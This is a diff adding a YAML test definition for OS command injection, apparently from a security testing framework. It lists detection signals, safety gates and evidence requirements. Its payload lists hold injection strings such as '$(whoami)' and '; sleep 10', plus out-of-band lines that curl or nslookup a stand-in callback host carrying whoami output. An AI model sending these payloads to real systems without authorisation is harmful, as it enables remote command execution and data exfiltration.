@@ -1,0 +1,102 @@
+id: rce-command-injection
+name: OS Command Injection
+category: rce
+description: >
+  Application passes user-supplied input to a system shell or OS command
+  execution function (system(), exec(), popen(), subprocess, os/exec).
+  Attacker injects shell metacharacters (;, |, ||, &&, $(), backticks, \n)
+  to execute arbitrary commands on the underlying operating system. Found in
+  ping utilities, file conversion tools, backup scripts, and monitoring.
+severity: critical
+standards:
+  wstg:
+    - WSTG-INPV-12
+  asvs:
+    - "V5.1.4"
+    - "V5.3.8"
+  vrt:
+    - command_injection
+  cwe:
+    - CWE-77
+applies_to:
+  archetypes:
+    - all
+  surfaces:
+    - system-utility-endpoints
+    - admin-tools
+    - file-converters
+    - monitoring-dashboards
+    - backup-interfaces
+requires:
+  auth: admin
+  inputs:
+    - parameters passed to system commands (filename, hostname, options)
+    - katana-crawled forms with file/network/system operations
+  tools:
+    - curl
+    - interact_sh_client
+signals:
+  positive:
+    - Sleep or time delay injection confirms execution (sleep 5 causes delay)
+    - OOB callback to collaborator with hostname or whoami output
+    - Injection causes different response from baseline (success/fail code)
+    - Command output returned in HTTP response body
+    - Error message includes shell or OS-level details
+  negative:
+    - Input properly escaped for shell context (escapeshellarg, shlex.quote)
+    - Application uses execve() with argument vector (no shell parsing)
+    - Strict allowlist on input values (only predefined options accepted)
+    - Input type validation rejects non-alphanumeric characters
+    - Application runs in minimal container/sandbox (no shell available)
+safety:
+  intrusive: true
+  data_modifying: false
+  rate_limited: false
+  requires_approval: true
+evidence:
+  required:
+    - curl with injected command and timing/OOB proof
+    - Response showing command output or error
+    - OOB callback log with extracted hostname/whoami
+    - Screenshot of injection and response
+references:
+  urls:
+    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection
+    - https://portswigger.net/web-security/os-command-injection
+  papers:
+    - OWASP Command Injection Prevention Cheat Sheet
+  writeups: []
+workflow_mapping:
+  skill: rce
+  workflow: W1 (command injection)
+payload_families:
+  - name: separator_chaining
+    description: Shell metacharacters to chain additional commands
+    examples:
+      - "; id"
+      - "| whoami"
+      - "|| whoami"
+      - "&& whoami"
+      - "`whoami`"
+      - "$(whoami)"
+      - "%0Awhoami"
+  - name: blind_oob
+    description: Non-visible injection detected via OOB callbacks
+    examples:
+      - "; nslookup UNIQUE.callback.example.com"
+      - "| ping -c 3 callback.example.com"
+      - "; curl http://callback.example.com/?h=$(whoami)"
+  - name: time_based
+    description: Inject sleep/delay commands to confirm blind execution
+    examples:
+      - "; sleep 10"
+      - "| sleep 10"
+      - "& ping -c 10 127.0.0.1 &"
+tags:
+  - os-command
+  - shell-injection
+  - metacharacter
+  - critical
+  - intrusive
+  - requires-approval
+  - system-call
